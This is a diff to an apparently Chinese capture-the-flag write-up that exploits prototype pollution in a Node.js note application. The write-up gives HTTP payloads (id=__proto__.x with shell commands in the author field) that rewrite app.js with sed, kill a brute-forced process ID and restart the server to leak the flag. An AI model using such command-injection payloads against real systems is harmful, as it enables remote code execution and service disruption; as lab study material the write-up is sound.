@@ -57,16 +57,10 @@ if __name__ == '__main__':
 利用上边的思路还是能当成不出网的题目做的
 
 POST `http://172.18.36.237:28052/edit_note`  
-`id=__proto__.x&raw=x&author=sed -i 's#Sorry cant find that!#'$FLAG'#' app.js`  污染，替换404为flag  
-
-GET `http://172.18.36.237:28016/status` 刷新  
-
-POST `http://172.18.36.237:28052/edit_note`   
-`id=__proto__.x&raw=x&author=kill -9 29`  杀掉进程，守护进程会让它重启  
-没有重启可以执行一次 `node app.js`  
-
-GET `http://172.18.36.237:28016/status` 刷新  
+`id=__proto__.x&raw=x&author=sed -i 's#Sorry cant find that!#'$FLAG'#' app.js %26 kill -9 29`  
+污染，替换404为flag  
 pid可以从200往下爆破，无响应后重启就中了。每次容器初次启动都在29号。  
+杀掉进程，守护进程会让它重启,没有重启可以执行一次 `%26 node app.js`    
 
-
+GET `http://172.18.36.237:28016/status` 刷新  
 GET `http://172.18.36.237:28016/fuck` 随便找个404页面就可以拿到flag。  
